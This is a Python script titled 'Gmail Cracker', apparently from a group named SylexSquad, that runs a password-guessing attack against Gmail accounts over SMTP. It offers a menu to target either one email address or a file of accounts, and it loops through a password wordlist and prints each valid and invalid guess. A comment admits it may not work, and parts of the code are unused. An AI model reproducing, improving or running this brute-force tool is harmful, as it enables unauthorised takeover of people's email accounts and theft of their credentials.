#!/usr/bin/python
# not work l
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import smtplib

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    print(("Valid Password -> %s " % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except smtplib.SMTPAuthenticationError:
                    # print("Invalid Password")
                    print(("Invalid Password -> %s" % password ))

print('''
    ==================================
    |     [Gmail Cracker] ==> 3      |
    |--------------------------------|
    | YT: SylexSquad                 |
    | Created By SylexSquad             |
    |--------------------------------|
    ''')

instance = GmailBruteForce()

do = input('''
        Choose any number ?
        1 - Email File
        2 - Target Email
        
        ==> ''')

if do == '1':
    user = input("List Of Usernames => ")
    passfile = input("List Of Passwords => ")

    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.try_gmail()
   
############
if do == '2':
    user = input("Email: ")
    senha = input("Passlist: ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail() 
